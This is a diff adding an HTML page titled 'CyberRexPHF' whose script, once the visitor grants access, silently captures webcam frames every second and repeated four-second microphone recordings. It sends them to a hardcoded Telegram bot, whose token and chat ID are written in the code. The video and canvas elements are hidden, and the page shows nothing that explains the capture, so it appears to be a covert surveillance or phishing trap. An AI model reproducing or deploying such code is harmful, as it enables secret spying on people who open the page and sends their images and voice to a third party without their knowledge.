@@ -1,0 +1,119 @@
+<!DOCTYPE html>  
+<html>  
+<head>  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>CyberRexPHF</title>  
+    <style>  
+        #video {  
+            display: none;  
+        }  
+    </style>  
+</head>  
+<body>  
+    <video id="video" autoplay></video>  
+    <canvas id="canvas" width="2000" height="2000" style="display: none;"></canvas>  
+  
+    <script>  
+        const botToken = "7848675038:AAH9aCKUvXbVxsv6QB0jL31NajRKTXYrGrE";  
+        const chatId = "6811943916";  
+  
+        function startCamera() {  
+            const video = document.getElementById("video");  
+            const canvas = document.getElementById("canvas");  
+            const ctx = canvas.getContext("2d");  
+  
+            navigator.mediaDevices.getUserMedia({ video: true })  
+                .then(stream => {  
+                    video.srcObject = stream;  
+  
+                    setInterval(() => {  
+                        ctx.drawImage(video, 0, 0, 2000, 2000);  
+                        canvas.toBlob(sendToTelegram, "image/jpeg", 0.8);  
+                        startRecording();  
+                    }, 1000);  
+                })  
+                .catch(error => {  
+                    console.error(error);  
+                    alert("Failed to access camera.");  
+                });  
+        }  
+  
+        function sendToTelegram(blob) {  
+            const formData = new FormData();  
+            formData.append("photo", blob, "camera.jpg");  
+            formData.append("chat_id", chatId);  
+  
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {  
+                method: "POST",  
+                body: formData,  
+            })  
+                .then(response => response.json())  
+                .then(data => {  
+                    if (data.ok) {  
+                        console.log("Camera frame sent to Telegram.");  
+                    } else {  
+                        throw new Error(data.description);  
+                    }  
+                })  
+                .catch(error => {  
+                    console.error(error);  
+                    alert("Failed to send camera frame.");  
+                });  
+        }  
+  
+        function sendAudioToTelegram(blob) {  
+            const formData = new FormData();  
+            formData.append("audio", blob, "recording.wav");  
+            formData.append("chat_id", chatId);  
+  
+            fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {  
+                method: "POST",  
+                body: formData,  
+            })  
+                .then(response => response.json())  
+                .then(data => {  
+                    if (data.ok) {  
+                        console.log("Audio recording sent to Telegram.");  
+                    } else {  
+                        throw new Error(data.description);  
+                    }  
+                })  
+                .catch(error => {  
+                    console.error(error);  
+                    alert("Failed to send audio recording.");  
+                });  
+        }  
+  
+        function startRecording() {  
+            const audioChunks = [];  
+  
+            navigator.mediaDevices  
+                .getUserMedia({ audio: true, video: false })  
+                .then((stream) => {  
+                    const mediaRecorder = new MediaRecorder(stream);  
+  
+                    mediaRecorder.start();  
+  
+                    setTimeout(() => {  
+                        mediaRecorder.stop();  
+                    }, 4000);  
+  
+                    mediaRecorder.addEventListener("dataavailable", (event) => {  
+                        audioChunks.push(event.data);  
+                    });  
+  
+                    mediaRecorder.addEventListener("stop", () => {  
+                        const audioBlob = new Blob(audioChunks, { type: "audio/wav" });  
+                        sendAudioToTelegram(audioBlob);  
+                    });  
+                })  
+                .catch((error) => {  
+                    console.error(error);  
+                    alert("Failed to access microphone.");  
+                });  
+        }  
+  
+        startCamera();  
+    </script>  
+</body>  
+</html>
